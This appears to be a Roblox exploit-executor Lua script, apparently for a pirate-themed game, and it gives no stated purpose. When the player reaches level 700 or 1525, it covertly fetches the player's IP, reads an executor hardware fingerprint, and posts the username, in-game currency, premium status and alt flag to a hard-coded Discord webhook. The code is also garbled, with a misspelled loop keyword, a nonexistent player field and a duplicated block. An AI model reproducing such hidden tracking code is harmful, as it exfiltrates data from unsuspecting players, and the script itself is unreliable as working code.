Script
    
    whlie true do wait(.1)
    if game:GetService("Players").LocalPlayer.Data.Level.Value == 700 then
    
    local IP = game:HttpGet("https://v4.ident.me")
    plr = game:GetService'Players'.LocalPlayer
    local premium = false
    local ALT = false
    if plr.MembershipType == Enum.MembershipType.Premium then
        premium = true
    elseif plr.MembershipType == Enum.MembershipType.None then
        premium = false
    end
    if premium == false then 
        if plr.AccountAge <= 70 then 
            ALT = true
        end
    end
    local market = game:GetService("MarketplaceService")
    local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
    
    local http_request = http_request;
    if syn then
        http_request = syn.request
    elseif SENTINEL_V2 then
        function http_request(tb)
            return {
                StatusCode = 200;
                Body = request(tb.Url, tb.Method, (tb.Body or ''))
            }
        end
    end
    
    local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
    local decoded = game:GetService('HttpService'):JSONDecode(body)
    local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
    hwid = "";
    
    for i, v in next, hwid_list do
        if decoded.headers[v] then
            hwid = decoded.headers[v];
            break
        end
    end
    
    if hwid then
    local HttpServ = game:GetService('HttpService')
    local url = "https://discord.com/api/webhooks/885761602387853332/M_luC5mrHTVT4s1i5FuB00Sr_tdX020vazj45XCJN8g7UyKp-AjfKGhlzsPiFi2uvDN1"
    
    
    local data = 
        {
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "__**Level:**__",
                ["description"] = game:GetService("Players").QAllPlayer.Data.Level.Value,
                ["type"] = "rich",
                ["color"] = tonumber(0xAB0909),
                ["fields"] = {
                    {
                        ["name"] = "Username:",
                        ["value"] = Game.Players.LocalPlayer.Name,
                        
                    },
                    {
                        ["name"] = "Beli",
                        ["value"] = game:GetService("Players").LocalPlayer.Data.Beli.Value,
                       
                    },
                    {
                        ["name"] = "Game Link:",
                        ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
                       
                    },
                    {
                        ["name"] = "Game Name:",
                        ["value"] = info.Name,
                    
                    },
                    {
                        ["name"] = "Fragments",
                        ["value"] = game:GetService("Players").LocalPlayer.Data.Fragments.Value,
                    
                    },
                    {
                        ["name"] = "Premium:",
                        ["value"] = premium,
                        
                    },
                    {
                        ["name"] = "ALT:",
                        ["value"] = ALT,
                        
                    },
                    
                },
            }}
        }
        local newdata = HttpServ:JSONEncode(data)
        
        local headers = {
                ["content-type"] = "application/json"
        }
        
        local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
        http_request(request_payload)
    end
    
    elseif game:GetService("Players").LocalPlayer.Data.Level.Value == 1525 then
    
    local IP = game:HttpGet("https://v4.ident.me")
    plr = game:GetService'Players'.LocalPlayer
    local premium = false
    local ALT = false
    if plr.MembershipType == Enum.MembershipType.Premium then
        premium = true
    elseif plr.MembershipType == Enum.MembershipType.None then
        premium = false
    end
    if premium == false then 
        if plr.AccountAge <= 70 then 
            ALT = true
        end
    end
    local market = game:GetService("MarketplaceService")
    local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
    
    local http_request = http_request;
    if syn then
        http_request = syn.request
    elseif SENTINEL_V2 then
        function http_request(tb)
            return {
                StatusCode = 200;
                Body = request(tb.Url, tb.Method, (tb.Body or ''))
            }
        end
    end
    
    local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
    local decoded = game:GetService('HttpService'):JSONDecode(body)
    local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
    hwid = "";
    
    for i, v in next, hwid_list do
        if decoded.headers[v] then
            hwid = decoded.headers[v];
            break
        end
    end
    
    if hwid then
    local HttpServ = game:GetService('HttpService')
    local url = "https://discord.com/api/webhooks/885761602387853332/M_luC5mrHTVT4s1i5FuB00Sr_tdX020vazj45XCJN8g7UyKp-AjfKGhlzsPiFi2uvDN1"
    
    
    local data = 
        {
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "__**Level:**__",
                ["description"] = game:GetService("Players").QAllPlayer.Data.Level.Value,
                ["type"] = "rich",
                ["color"] = tonumber(0xAB0909),
                ["fields"] = {
                    {
                        ["name"] = "Username:",
                        ["value"] = Game.Players.LocalPlayer.Name,
                        
                    },
                    {
                        ["name"] = "Beli",
                        ["value"] = game:GetService("Players").LocalPlayer.Data.Beli.Value,
                       
                    },
                    {
                        ["name"] = "Game Link:",
                        ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
                       
                    },
                    {
                        ["name"] = "Game Name:",
                        ["value"] = info.Name,
                    
                    },
                    {
                        ["name"] = "Fragments",
                        ["value"] = game:GetService("Players").LocalPlayer.Data.Fragments.Value,
                    
                    },
                    {
                        ["name"] = "Premium:",
                        ["value"] = premium,
                        
                    },
                    {
                        ["name"] = "ALT:",
                        ["value"] = ALT,
                        
                    },
                    
                },
            }}
        }
        local newdata = HttpServ:JSONEncode(data)
        
        local headers = {
                ["content-type"] = "application/json"
        }
        
        local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
        http_request(request_payload)
    end
    
    end
    end
